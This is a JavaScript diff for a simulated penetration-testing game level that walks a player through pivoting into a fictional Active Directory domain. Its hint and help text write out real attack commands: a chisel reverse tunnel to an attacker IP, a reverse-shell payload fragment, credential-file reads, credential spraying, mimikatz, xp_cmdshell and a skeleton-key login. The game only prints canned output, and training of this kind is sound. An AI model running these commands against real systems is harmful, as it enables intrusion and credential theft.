@@ -1,0 +1,1205 @@
+<script>
+// ============================================
+// LEVEL 2: NETWORK PIVOT - Multi-Host AD Attack
+// ============================================
+
+const LEVEL2_NETWORK = {
+  segments: {
+    dmz: { name: 'DMZ', subnet: '10.10.10.0/24' },
+    internal: { name: 'INTERNAL', subnet: '172.16.1.0/24' },
+    core: { name: 'CORE', subnet: '192.168.100.0/24' }
+  },
+  hosts: {
+    'WEB01': {
+      ip: '10.10.10.15',
+      segment: 'dmz',
+      os: 'Ubuntu 22.04',
+      services: ['22/ssh', '80/http', '8080/http-proxy'],
+      compromised: false,
+      accessible: true,
+      creds: null,
+      description: 'Public web server - Jenkins CI'
+    },
+    'FILE01': {
+      ip: '172.16.1.20',
+      segment: 'internal',
+      os: 'Windows Server 2019',
+      services: ['135/msrpc', '445/smb', '3389/rdp', '5985/winrm'],
+      compromised: false,
+      accessible: false,
+      creds: { user: 'svc_jenkins', pass: 'J3nk1ns@dm1n!' },
+      description: 'Internal file server - credential reuse target'
+    },
+    'DB01': {
+      ip: '172.16.1.50',
+      segment: 'internal',
+      os: 'Windows Server 2019',
+      services: ['135/msrpc', '445/smb', '1433/mssql', '5985/winrm'],
+      compromised: false,
+      accessible: false,
+      creds: null,
+      description: 'MSSQL Server - xp_cmdshell'
+    },
+    'DC01': {
+      ip: '192.168.100.10',
+      segment: 'core',
+      os: 'Windows Server 2022',
+      services: ['53/dns', '88/kerberos', '135/msrpc', '389/ldap', '445/smb', '636/ldaps'],
+      compromised: false,
+      accessible: false,
+      creds: null,
+      description: 'Domain Controller - YOURCOMPANY.LOCAL'
+    }
+  },
+  tunnels: [],
+  currentSession: null
+};
+
+async function initLevel2() {
+  gameState.levelState = {
+    // Phase 1: Initial Access (WEB01)
+    webScanned: false,
+    foundJenkins: false,
+    jenkinsExploited: false,
+    gotWebShell: false,
+    foundCreds: false,
+
+    // Phase 2: Pivoting Setup
+    uploadedChisel: false,
+    tunnelEstablished: false,
+    internalScanned: false,
+
+    // Phase 3: Lateral Movement (FILE01)
+    file01Scanned: false,
+    file01Accessed: false,
+    foundLsass: false,
+    dumpedCreds: false,
+
+    // Phase 4: Database Pivot (DB01)
+    db01Scanned: false,
+    mssqlAccessed: false,
+    xpCmdEnabled: false,
+    db01Shell: false,
+
+    // Phase 5: Domain Compromise (DC01)
+    coreAccessible: false,
+    skeletonKeyInjected: false,
+    dcAccessed: false,
+    domainAdmin: false,
+
+    // Current state
+    currentHost: 'attacker',
+    currentSegment: 'external',
+    activeProxy: null,
+    chiselPort: null,
+    compromisedHosts: [],
+    flags: {
+      user: false,
+      root: false
+    }
+  };
+
+  clear();
+  print('');
+  print('╔═══════════════════════════════════════════════════════════════════════════╗', 'info');
+  print('║                    LEVEL 2: NETWORK PIVOT                                 ║', 'info');
+  print('║                    "Trust No Network Boundary"                            ║', 'warning');
+  print('╠═══════════════════════════════════════════════════════════════════════════╣', 'info');
+  print('║                                                                           ║', 'info');
+  print('║   ┌─────────┐        ┌─────────┐        ┌─────────┐        ┌─────────┐   ║', 'info');
+  print('║   │ATTACKER │───────▶│  WEB01  │ ─ ─ ─ ▶│ FILE01  │ ─ ─ ─ ▶│  DC01   │   ║', 'info');
+  print('║   │10.10.14.│  DMZ   │10.10.10.│INTERNAL│172.16.1.│  CORE  │192.168. │   ║', 'info');
+  print('║   │   5     │        │   15    │        │   20    │        │100.10   │   ║', 'info');
+  print('║   └─────────┘        └─────────┘        └─────────┘        └─────────┘   ║', 'info');
+  print('║        │                  │                  │                  │        ║', 'info');
+  print('║        │                  │                  ▼                  │        ║', 'info');
+  print('║        │                  │             ┌─────────┐             │        ║', 'info');
+  print('║        │                  │             │  DB01   │─────────────┘        ║', 'info');
+  print('║        │                  │             │172.16.1.│                      ║', 'info');
+  print('║        │                  │             │   50    │                      ║', 'info');
+  print('║        │                  │             └─────────┘                      ║', 'info');
+  print('║        │                  │                                              ║', 'info');
+  print('║   [EXTERNAL]         [DMZ SEGMENT]    [INTERNAL SEGMENT]   [CORE]        ║', 'info');
+  print('║                                                                           ║', 'info');
+  print('╠═══════════════════════════════════════════════════════════════════════════╣', 'info');
+  print('║  TARGET: YOURCOMPANY.LOCAL Domain Controller                             ║', 'warning');
+  print('║  ENTRY:  WEB01 (10.10.10.15) - Jenkins CI Server (Public)                ║', 'success');
+  print('║  GOAL:   Pivot through network segments → Compromise Domain              ║', 'info');
+  print('╚═══════════════════════════════════════════════════════════════════════════╝', 'info');
+  print('');
+
+  await typeText('[BRIEFING] Target acquired: YOURCOMPANY.LOCAL', 30, 'system');
+  await typeText('[BRIEFING] Initial recon shows Jenkins CI exposed on DMZ', 30, 'system');
+  await typeText('[BRIEFING] Internal network is segmented - you will need to pivot', 30, 'warning');
+  await typeText('[BRIEFING] Tools available: chisel, ligolo-ng, proxychains', 30, 'info');
+  print('');
+
+  updateHUD('2 - Network Pivot', 'YOURCOMPANY.LOCAL', 'Domain Compromise via Pivoting', 0);
+  setPrompt('root', 'kali', '~');
+
+  LEVEL2_NETWORK.hosts['WEB01'].accessible = true;
+}
+
+async function handleLevel2Command(cmd, args) {
+  const state = gameState.levelState;
+  const fullCmd = args.length > 0 ? `${cmd} ${args.join(' ')}` : cmd;
+
+  // ═══════════════════════════════════════════════════════════════
+  // HELP COMMAND
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'help') {
+    print('');
+    print('╔══════════════════════════════════════════════════════════════════════════╗', 'info');
+    print('║                         LEVEL 2 COMMANDS                                 ║', 'info');
+    print('╠══════════════════════════════════════════════════════════════════════════╣', 'info');
+    print('║  RECONNAISSANCE:                                                         ║', 'info');
+    print('║    nmap -sV -sC <ip>         Service scan with scripts                  ║', 'system');
+    print('║    nmap -p- <ip>             Full port scan                             ║', 'system');
+    print('║    curl <url>                HTTP request                               ║', 'system');
+    print('║    gobuster dir -u <url>     Directory enumeration                      ║', 'system');
+    print('║                                                                          ║', 'info');
+    print('║  EXPLOITATION:                                                           ║', 'info');
+    print('║    searchsploit <term>       Search for exploits                        ║', 'system');
+    print('║    jenkins-exploit <url>     Exploit Jenkins Groovy console             ║', 'system');
+    print('║                                                                          ║', 'info');
+    print('║  PIVOTING:                                                               ║', 'info');
+    print('║    upload chisel             Upload chisel to current host              ║', 'success');
+    print('║    chisel server -p <port>   Start chisel server (on attacker)          ║', 'success');
+    print('║    chisel client <args>      Connect chisel client                      ║', 'success');
+    print('║    proxychains <cmd>         Run command through SOCKS proxy            ║', 'success');
+    print('║                                                                          ║', 'info');
+    print('║  CREDENTIAL ATTACKS:                                                     ║', 'info');
+    print('║    crackmapexec smb <ip>     Enumerate SMB / spray creds                ║', 'system');
+    print('║    evil-winrm -i <ip> -u -p  WinRM shell                                ║', 'system');
+    print('║    mssqlclient.py <args>     Connect to MSSQL                           ║', 'system');
+    print('║    mimikatz                  Credential dumping (when on Windows host)  ║', 'warning');
+    print('║    skeleton                  Inject skeleton key into DC                ║', 'error');
+    print('║                                                                          ║', 'info');
+    print('║  SESSION MANAGEMENT:                                                     ║', 'info');
+    print('║    sessions                  List active sessions                       ║', 'system');
+    print('║    session <id>              Switch to session                          ║', 'system');
+    print('║    background                Background current session                 ║', 'system');
+    print('║                                                                          ║', 'info');
+    print('║  FILESYSTEM (when in shell):                                             ║', 'info');
+    print('║    ls, dir, cat, type        File operations                            ║', 'system');
+    print('║    whoami, hostname, id      Identity commands                          ║', 'system');
+    print('║                                                                          ║', 'info');
+    print('║  UTILITY:                                                                ║', 'info');
+    print('║    netmap                    Show network topology                      ║', 'success');
+    print('║    status                    Show current progress                      ║', 'success');
+    print('║    hint                      Get a contextual hint                      ║', 'warning');
+    print('║    exit                      Return to main menu                        ║', 'system');
+    print('╚══════════════════════════════════════════════════════════════════════════╝', 'info');
+    print('');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // STATUS COMMAND
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'status') {
+    const progress = calculateLevel2Progress(state);
+    print('');
+    print('╔══════════════════════════════════════════════════════════════╗', 'info');
+    print('║              LEVEL 2 PROGRESS - NETWORK PIVOT                ║', 'info');
+    print('╠══════════════════════════════════════════════════════════════╣', 'info');
+    print('║  PHASE 1 - INITIAL ACCESS (WEB01):                           ║', 'info');
+    print(`║    [${state.webScanned ? '✓' : ' '}] Web server scanned                              ║`, state.webScanned ? 'success' : 'system');
+    print(`║    [${state.foundJenkins ? '✓' : ' '}] Jenkins discovered                              ║`, state.foundJenkins ? 'success' : 'system');
+    print(`║    [${state.gotWebShell ? '✓' : ' '}] Shell obtained on WEB01                         ║`, state.gotWebShell ? 'success' : 'system');
+    print(`║    [${state.foundCreds ? '✓' : ' '}] Credentials found                               ║`, state.foundCreds ? 'success' : 'system');
+    print('║                                                              ║', 'info');
+    print('║  PHASE 2 - PIVOTING:                                         ║', 'info');
+    print(`║    [${state.uploadedChisel ? '✓' : ' '}] Chisel uploaded                                ║`, state.uploadedChisel ? 'success' : 'system');
+    print(`║    [${state.tunnelEstablished ? '✓' : ' '}] SOCKS tunnel established                      ║`, state.tunnelEstablished ? 'success' : 'system');
+    print(`║    [${state.internalScanned ? '✓' : ' '}] Internal network scanned                       ║`, state.internalScanned ? 'success' : 'system');
+    print('║                                                              ║', 'info');
+    print('║  PHASE 3 - LATERAL MOVEMENT (FILE01):                        ║', 'info');
+    print(`║    [${state.file01Accessed ? '✓' : ' '}] FILE01 compromised                             ║`, state.file01Accessed ? 'success' : 'system');
+    print(`║    [${state.dumpedCreds ? '✓' : ' '}] Domain credentials dumped                       ║`, state.dumpedCreds ? 'success' : 'system');
+    print('║                                                              ║', 'info');
+    print('║  PHASE 4 - DATABASE PIVOT (DB01):                            ║', 'info');
+    print(`║    [${state.mssqlAccessed ? '✓' : ' '}] MSSQL access obtained                          ║`, state.mssqlAccessed ? 'success' : 'system');
+    print(`║    [${state.db01Shell ? '✓' : ' '}] Shell on DB01                                   ║`, state.db01Shell ? 'success' : 'system');
+    print('║                                                              ║', 'info');
+    print('║  PHASE 5 - DOMAIN COMPROMISE (DC01):                         ║', 'info');
+    print(`║    [${state.skeletonKeyInjected ? '✓' : ' '}] Skeleton key injected                         ║`, state.skeletonKeyInjected ? 'success' : 'system');
+    print(`║    [${state.domainAdmin ? '✓' : ' '}] Domain Admin achieved                          ║`, state.domainAdmin ? 'success' : 'system');
+    print('╠══════════════════════════════════════════════════════════════╣', 'info');
+    print(`║  Overall Progress: ${String(progress).padStart(3)}%                                      ║`, progress === 100 ? 'success' : 'warning');
+    print(`║  Current Host: ${state.currentHost.padEnd(42)} ║`, 'system');
+    print(`║  Active Proxy: ${(state.activeProxy || 'None').padEnd(42)} ║`, state.activeProxy ? 'success' : 'system');
+    print('╚══════════════════════════════════════════════════════════════╝', 'info');
+    print('');
+    updateHUD('2 - Network Pivot', 'YOURCOMPANY.LOCAL', 'Domain Compromise', progress);
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // HINT COMMAND
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'hint') {
+    print('');
+    print('💡 HINT:', 'warning');
+
+    if (!state.webScanned) {
+      print('Start by scanning the web server in the DMZ.', 'info');
+      print('Try: nmap -sV -sC 10.10.10.15', 'success');
+    } else if (!state.foundJenkins) {
+      print('Enumerate web directories to find admin panels.', 'info');
+      print('Try: gobuster dir -u http://10.10.10.15:8080', 'success');
+    } else if (!state.gotWebShell) {
+      print('Jenkins often has a Script Console for Groovy code execution.', 'info');
+      print('Try: curl http://10.10.10.15:8080/script', 'success');
+    } else if (!state.foundCreds) {
+      print('Check for credentials in config files and environment variables.', 'info');
+      print('Try: cat /var/lib/jenkins/secrets/initialAdminPassword', 'success');
+      print('Also try: env or cat ~/.bash_history', 'info');
+    } else if (!state.uploadedChisel) {
+      print('You need to pivot to reach internal hosts. Upload a tunneling tool.', 'info');
+      print('Try: upload chisel', 'success');
+    } else if (!state.tunnelEstablished) {
+      print('Start a chisel server on your attacker, then connect from WEB01.', 'info');
+      print('On attacker: chisel server -p 8000 --reverse', 'success');
+      print('On WEB01: chisel client 10.10.14.5:8000 R:1080:socks', 'info');
+    } else if (!state.file01Accessed) {
+      print('Use proxychains with the discovered credentials to access FILE01.', 'info');
+      print('Try: proxychains crackmapexec smb 172.16.1.20 -u svc_jenkins -p "J3nk1ns@dm1n!"', 'success');
+    } else if (!state.dumpedCreds) {
+      print('Once on FILE01, dump credentials with mimikatz.', 'info');
+      print('Try: mimikatz', 'success');
+    } else if (!state.mssqlAccessed) {
+      print('Use the domain creds to access the MSSQL server.', 'info');
+      print('Try: proxychains mssqlclient.py YOURCOMPANY/sql_svc@172.16.1.50', 'success');
+    } else if (!state.db01Shell) {
+      print('Enable xp_cmdshell for command execution on DB01.', 'info');
+      print('SQL> enable_xp_cmdshell', 'success');
+      print('SQL> xp_cmdshell whoami', 'info');
+    } else if (!state.skeletonKeyInjected) {
+      print('From DB01, you can reach the CORE segment and the DC.', 'info');
+      print('A skeleton key attack patches LSASS to accept a master password.', 'warning');
+      print('Try: skeleton', 'error');
+    } else if (!state.domainAdmin) {
+      print('The skeleton key is injected! Use "mimikatz" as password for any user.', 'info');
+      print('Try: proxychains evil-winrm -i 192.168.100.10 -u Administrator -p mimikatz', 'success');
+    } else {
+      print('Verify your Domain Admin access!', 'info');
+      print('Try: whoami /groups', 'success');
+    }
+    print('');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // NETMAP COMMAND
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'netmap') {
+    printLevel2NetworkMap(state);
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // NMAP COMMAND
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'nmap') {
+    const target = args.find(a => /^\d+\.\d+\.\d+\.\d+$/.test(a));
+
+    if (!target) {
+      print('Usage: nmap -sV -sC <ip>', 'error');
+      return;
+    }
+
+    // Check if target is reachable
+    if (target.startsWith('172.16.') || target.startsWith('192.168.100.')) {
+      if (!state.tunnelEstablished) {
+        print(`connect: Network is unreachable`, 'error');
+        print('', '');
+        print('[!] Internal network not accessible from here.', 'warning');
+        print('[!] You need to establish a pivot through an intermediate host.', 'info');
+        return;
+      }
+      if (!state.activeProxy) {
+        print('[!] Use proxychains to route through your tunnel', 'warning');
+        print('Try: proxychains nmap ...', 'info');
+        return;
+      }
+    }
+
+    // WEB01 scan
+    if (target === '10.10.10.15') {
+      await simulateLoading('Scanning 10.10.10.15', 3000);
+      print('');
+      print('Nmap scan report for 10.10.10.15', 'system');
+      print('Host is up (0.045s latency).', 'system');
+      print('');
+      print('PORT     STATE SERVICE     VERSION', 'info');
+      print('22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu', 'system');
+      print('80/tcp   open  http        nginx 1.18.0', 'system');
+      print('8080/tcp open  http-proxy  Jetty 10.0.13', 'success');
+      print('|_http-title: Dashboard [Jenkins]', 'success');
+      print('|_http-server-header: Jetty(10.0.13)', 'system');
+      print('');
+      print('[+] Jenkins CI detected on port 8080!', 'success');
+      state.webScanned = true;
+      autosave();
+      return;
+    }
+
+    // Internal scans
+    if (target === '172.16.1.20' && state.tunnelEstablished) {
+      await simulateLoading(`Scanning ${target} through proxy`, 4000);
+      print('');
+      print('Nmap scan report for 172.16.1.20', 'system');
+      print('Host is up (0.12s latency).', 'system');
+      print('');
+      print('PORT     STATE SERVICE       VERSION', 'info');
+      print('135/tcp  open  msrpc         Microsoft Windows RPC', 'system');
+      print('445/tcp  open  microsoft-ds  Windows Server 2019', 'success');
+      print('3389/tcp open  ms-wbt-server Microsoft Terminal Services', 'system');
+      print('5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)', 'success');
+      print('');
+      print('Host script results:', 'info');
+      print('| smb2-security-mode:', 'system');
+      print('|   3.1.1:', 'system');
+      print('|_    Message signing enabled but not required', 'warning');
+      print('');
+      state.file01Scanned = true;
+      state.internalScanned = true;
+      autosave();
+      return;
+    }
+
+    if (target === '172.16.1.50' && state.tunnelEstablished) {
+      await simulateLoading(`Scanning ${target} through proxy`, 4000);
+      print('');
+      print('Nmap scan report for 172.16.1.50', 'system');
+      print('Host is up (0.089s latency).', 'system');
+      print('');
+      print('PORT     STATE SERVICE       VERSION', 'info');
+      print('135/tcp  open  msrpc         Microsoft Windows RPC', 'system');
+      print('445/tcp  open  microsoft-ds  Windows Server 2019', 'system');
+      print('1433/tcp open  ms-sql-s      Microsoft SQL Server 2019', 'success');
+      print('| ms-sql-info:', 'system');
+      print('|   Version: 15.0.2000.5', 'system');
+      print('|_  TCP port: 1433', 'system');
+      print('5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)', 'system');
+      print('');
+      state.db01Scanned = true;
+      autosave();
+      return;
+    }
+
+    if (target === '192.168.100.10') {
+      if (!state.coreAccessible) {
+        print('connect: No route to host', 'error');
+        print('[!] CORE segment not reachable from current pivot', 'warning');
+        return;
+      }
+      await simulateLoading(`Scanning ${target} through proxy`, 4000);
+      print('');
+      print('Nmap scan report for 192.168.100.10 (DC01.YOURCOMPANY.LOCAL)', 'system');
+      print('Host is up (0.15s latency).', 'system');
+      print('');
+      print('PORT     STATE SERVICE       VERSION', 'info');
+      print('53/tcp   open  domain        Simple DNS Plus', 'system');
+      print('88/tcp   open  kerberos-sec  Microsoft Windows Kerberos', 'warning');
+      print('135/tcp  open  msrpc         Microsoft Windows RPC', 'system');
+      print('389/tcp  open  ldap          Microsoft Windows AD LDAP', 'success');
+      print('445/tcp  open  microsoft-ds  Windows Server 2022', 'system');
+      print('636/tcp  open  ssl/ldap      Microsoft Windows AD LDAP', 'system');
+      print('5985/tcp open  http          Microsoft HTTPAPI (WinRM)', 'success');
+      print('');
+      print('[!] Domain Controller identified!', 'warning');
+      return;
+    }
+
+    print(`Host ${target} seems down or unreachable.`, 'error');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // GOBUSTER / DIRECTORY ENUMERATION
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'gobuster' || cmd === 'feroxbuster' || cmd === 'ffuf') {
+    if (!state.webScanned) {
+      print('[!] Scan the target first to identify web services', 'warning');
+      return;
+    }
+
+    if (fullCmd.includes('8080') || fullCmd.includes('10.10.10.15')) {
+      await simulateLoading('Enumerating directories', 3000);
+      print('');
+      print('===============================================================', 'system');
+      print('Gobuster v3.5', 'system');
+      print('===============================================================', 'system');
+      print('[+] Url:           http://10.10.10.15:8080/', 'system');
+      print('[+] Wordlist:      /usr/share/seclists/Discovery/Web-Content/common.txt', 'system');
+      print('===============================================================', 'system');
+      print('/                     (Status: 200) [Jenkins Dashboard]', 'system');
+      print('/api                  (Status: 200) [Jenkins API]', 'system');
+      print('/login                (Status: 200) [Login Page]', 'system');
+      print('/manage               (Status: 403) [Requires Auth]', 'warning');
+      print('/script               (Status: 200) [Script Console]', 'success');
+      print('/credentials          (Status: 403) [Requires Auth]', 'system');
+      print('/computer             (Status: 200) [Build Executors]', 'system');
+      print('');
+      print('[!] /script - Groovy Script Console found! This could allow RCE!', 'success');
+      state.foundJenkins = true;
+      autosave();
+      return;
+    }
+
+    print('Usage: gobuster dir -u http://<target>:<port>', 'error');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // CURL - HTTP REQUESTS
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'curl') {
+    const url = args[0];
+
+    if (!url) {
+      print('Usage: curl <url>', 'error');
+      return;
+    }
+
+    if (url.includes('/script') || url.includes('script')) {
+      await sleep(500);
+      print('', '');
+      print('<html>', 'system');
+      print('<head><title>Script Console [Jenkins]</title></head>', 'system');
+      print('<body>', 'system');
+      print('  <h1>Script Console</h1>', 'system');
+      print('  <p>Type in an arbitrary Groovy script and execute it on the server.</p>', 'warning');
+      print('  <form method="POST" action="/script">', 'system');
+      print('    <textarea name="script" rows="20" cols="80"></textarea>', 'system');
+      print('    <input type="submit" value="Run">', 'system');
+      print('  </form>', 'system');
+      print('</body></html>', 'system');
+      print('', '');
+      print('[!] Groovy Script Console is accessible without auth!', 'success');
+      print('[!] Use jenkins-exploit to get a reverse shell', 'info');
+      state.jenkinsExploited = true;
+      autosave();
+      return;
+    }
+
+    print('curl: (7) Failed to connect', 'error');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // JENKINS EXPLOIT
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'jenkins-exploit' || cmd === 'exploit') {
+    if (!state.jenkinsExploited) {
+      print('[!] Enumerate the Jenkins server first', 'warning');
+      return;
+    }
+
+    await simulateLoading('Exploiting Jenkins Script Console', 2000);
+    print('');
+    print('[*] Sending Groovy reverse shell payload...', 'system');
+    print('[*] Payload: String host="10.10.14.5";int port=4444;...', 'system');
+    await sleep(1000);
+    print('[+] Payload executed!', 'success');
+    print('');
+    print('───────────────────────────────────────────────────', 'success');
+    print(' Shell obtained on WEB01 (10.10.10.15)', 'success');
+    print(' User: jenkins', 'success');
+    print('───────────────────────────────────────────────────', 'success');
+    print('');
+
+    state.gotWebShell = true;
+    state.currentHost = 'WEB01';
+    LEVEL2_NETWORK.hosts['WEB01'].compromised = true;
+    state.compromisedHosts.push('WEB01');
+    setPrompt('jenkins', 'WEB01', '/var/lib/jenkins');
+    playSuccess();
+    autosave();
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // FILESYSTEM COMMANDS (when on compromised host)
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'ls' || cmd === 'dir') {
+    if (state.currentHost === 'attacker') {
+      print('chisel_linux_amd64  exploits/  tools/  wordlists/', 'system');
+      return;
+    }
+
+    if (state.currentHost === 'WEB01') {
+      print('config.xml  jobs/  secrets/  users/  workspace/', 'system');
+      return;
+    }
+
+    if (state.currentHost === 'FILE01') {
+      print('Desktop/  Documents/  Downloads/  flag.txt', 'system');
+      return;
+    }
+
+    if (state.currentHost === 'DB01') {
+      print('MSSQL/  Backup/  Scripts/  flag.txt', 'system');
+      return;
+    }
+
+    if (state.currentHost === 'DC01') {
+      print('SYSVOL/  NTDS/  Scripts/  flag.txt', 'system');
+      return;
+    }
+
+    print('.', 'system');
+    return;
+  }
+
+  if (cmd === 'cat' || cmd === 'type') {
+    const file = args[0];
+
+    if (state.currentHost === 'WEB01') {
+      if (file && (file.includes('history') || file === '.bash_history')) {
+        print('# Jenkins deployment history', 'system');
+        print('ssh svc_jenkins@172.16.1.20', 'system');
+        print('# Password: J3nk1ns@dm1n!', 'success');
+        print('rsync -avz ./build/ svc_jenkins@172.16.1.20:/deploy/', 'system');
+        print('');
+        print('[!] Credentials found! svc_jenkins:J3nk1ns@dm1n!', 'success');
+        state.foundCreds = true;
+        playAlert();
+        autosave();
+        return;
+      }
+
+      if (file && file.includes('secret')) {
+        print('8f4e2a9c3d1b5e7f0a2c4d6e8f0a1b3c', 'system');
+        return;
+      }
+
+      if (file === '/etc/passwd') {
+        print('root:x:0:0:root:/root:/bin/bash', 'system');
+        print('jenkins:x:1000:1000:Jenkins:/var/lib/jenkins:/bin/bash', 'system');
+        return;
+      }
+    }
+
+    if (state.currentHost === 'FILE01' && file === 'flag.txt') {
+      print('FLAG{p1v0t_l1k3_4_pr0}', 'success');
+      state.flags.user = true;
+      addEasterEgg('lvl2_userflag', 'First pivot complete! User flag captured.');
+      return;
+    }
+
+    if (state.currentHost === 'DC01' && file === 'flag.txt') {
+      print('FLAG{sk3l3t0n_k3y_m4st3r}', 'success');
+      state.flags.root = true;
+      return;
+    }
+
+    print(`cat: ${file}: No such file or directory`, 'error');
+    return;
+  }
+
+  if (cmd === 'env') {
+    if (state.currentHost === 'WEB01') {
+      print('JENKINS_HOME=/var/lib/jenkins', 'system');
+      print('DEPLOY_USER=svc_jenkins', 'system');
+      print('DEPLOY_HOST=172.16.1.20', 'success');
+      print('PATH=/usr/local/bin:/usr/bin:/bin', 'system');
+      if (!state.foundCreds) {
+        print('');
+        print('[!] Interesting! There\'s a deploy user and host. Check .bash_history', 'info');
+      }
+      return;
+    }
+    print('PATH=/usr/local/bin:/usr/bin:/bin', 'system');
+    return;
+  }
+
+  if (cmd === 'whoami') {
+    if (state.currentHost === 'attacker') {
+      print('root', 'system');
+      return;
+    }
+    if (state.currentHost === 'WEB01') {
+      print('jenkins', 'system');
+      return;
+    }
+    if (state.currentHost === 'FILE01') {
+      print('YOURCOMPANY\\svc_jenkins', 'system');
+      return;
+    }
+    if (state.currentHost === 'DB01') {
+      print('nt authority\\system', 'success');
+      return;
+    }
+    if (state.currentHost === 'DC01') {
+      print('YOURCOMPANY\\Administrator', 'success');
+      if (!state.domainAdmin) {
+        state.domainAdmin = true;
+        completeLevel();
+      }
+      return;
+    }
+    return;
+  }
+
+  if (cmd === 'id') {
+    if (state.currentHost === 'WEB01') {
+      print('uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)', 'system');
+      return;
+    }
+    print(`id: command not found`, 'error');
+    return;
+  }
+
+  if (cmd === 'hostname') {
+    print(state.currentHost, 'system');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // CHISEL PIVOTING
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'upload') {
+    if (args[0] === 'chisel') {
+      if (state.currentHost !== 'WEB01') {
+        print('[!] You need a shell on a pivot host first', 'warning');
+        return;
+      }
+
+      await simulateLoading('Uploading chisel to WEB01', 2000);
+      print('[+] chisel_linux_amd64 uploaded to /tmp/chisel', 'success');
+      print('[+] chmod +x /tmp/chisel', 'system');
+      state.uploadedChisel = true;
+      autosave();
+      return;
+    }
+    print('Usage: upload <tool>', 'error');
+    return;
+  }
+
+  if (cmd === 'chisel') {
+    if (args[0] === 'server') {
+      if (state.currentHost !== 'attacker') {
+        print('[!] Start chisel server on your attacker machine', 'warning');
+        print('[!] Use "background" to return to attacker, or "session attacker"', 'info');
+        return;
+      }
+
+      const port = args.find(a => /^\d+$/.test(a)) || '8000';
+      print(`[*] Starting chisel server on port ${port}`, 'system');
+      print('[*] Listening for connections...', 'system');
+      state.chiselPort = port;
+      return;
+    }
+
+    if (args[0] === 'client') {
+      if (state.currentHost !== 'WEB01') {
+        print('[!] Run chisel client from your pivot host (WEB01)', 'warning');
+        return;
+      }
+
+      if (!state.uploadedChisel) {
+        print('[!] Upload chisel first: upload chisel', 'warning');
+        return;
+      }
+
+      if (!state.chiselPort) {
+        print('[!] Start chisel server on attacker first', 'warning');
+        print('On attacker: chisel server -p 8000 --reverse', 'info');
+        return;
+      }
+
+      await simulateLoading('Establishing reverse SOCKS tunnel', 2000);
+      print('');
+      print('[+] Chisel client connected!', 'success');
+      print('[+] SOCKS5 proxy established on 127.0.0.1:1080', 'success');
+      print('');
+      print('┌────────────────────────────────────────────────┐', 'info');
+      print('│  TUNNEL ACTIVE                                 │', 'info');
+      print('├────────────────────────────────────────────────┤', 'info');
+      print('│  Type: SOCKS5 Reverse Tunnel                   │', 'system');
+      print('│  Local: 127.0.0.1:1080                         │', 'system');
+      print('│  Via:   WEB01 (10.10.10.15)                    │', 'system');
+      print('│  Reach: 172.16.1.0/24 (Internal)               │', 'success');
+      print('└────────────────────────────────────────────────┘', 'info');
+      print('');
+      print('[*] Use "proxychains <command>" to route through tunnel', 'info');
+
+      state.tunnelEstablished = true;
+      LEVEL2_NETWORK.tunnels.push({ type: 'socks5', port: 1080, via: 'WEB01' });
+      playSuccess();
+      autosave();
+      return;
+    }
+
+    print('Usage: chisel server -p <port> --reverse', 'info');
+    print('       chisel client <server>:<port> R:socks', 'info');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // PROXYCHAINS
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'proxychains') {
+    if (!state.tunnelEstablished) {
+      print('[!] No tunnel established. Set up chisel first.', 'error');
+      return;
+    }
+
+    state.activeProxy = 'socks5://127.0.0.1:1080';
+    const subCmd = args[0];
+    const subArgs = args.slice(1);
+
+    print('[proxychains] config file found: /etc/proxychains4.conf', 'system');
+    print('[proxychains] preloading /usr/lib/libproxychains4.so', 'system');
+    print('[proxychains] DLL init: proxychains-ng 4.16', 'system');
+    print('');
+
+    // Re-run the command through proxy
+    if (subCmd) {
+      await handleLevel2Command(subCmd, subArgs);
+    }
+
+    state.activeProxy = null;
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // CRACKMAPEXEC - SMB ENUMERATION / CREDENTIAL SPRAY
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'crackmapexec' || cmd === 'cme') {
+    if (args[0] !== 'smb') {
+      print('Usage: crackmapexec smb <ip> [-u user] [-p pass]', 'error');
+      return;
+    }
+
+    const target = args[1];
+    const userArg = args.indexOf('-u');
+    const passArg = args.indexOf('-p');
+    const user = userArg !== -1 ? args[userArg + 1] : null;
+    const pass = passArg !== -1 ? args[passArg + 1]?.replace(/"/g, '') : null;
+
+    if (target === '172.16.1.20' && state.tunnelEstablished) {
+      if (user === 'svc_jenkins' && pass === 'J3nk1ns@dm1n!') {
+        await simulateLoading('Testing credentials', 2000);
+        print('');
+        print('SMB   172.16.1.20  445  FILE01  [*] Windows Server 2019 Build 17763', 'system');
+        print('SMB   172.16.1.20  445  FILE01  [+] YOURCOMPANY\\svc_jenkins:J3nk1ns@dm1n! (Pwn3d!)', 'success');
+        print('');
+        print('[!] Valid credentials! Host is Pwn3d (local admin rights)', 'success');
+        state.file01Accessed = true;
+        LEVEL2_NETWORK.hosts['FILE01'].compromised = true;
+        state.compromisedHosts.push('FILE01');
+        playAlert();
+        autosave();
+        return;
+      }
+
+      await simulateLoading('Testing credentials', 2000);
+      print('');
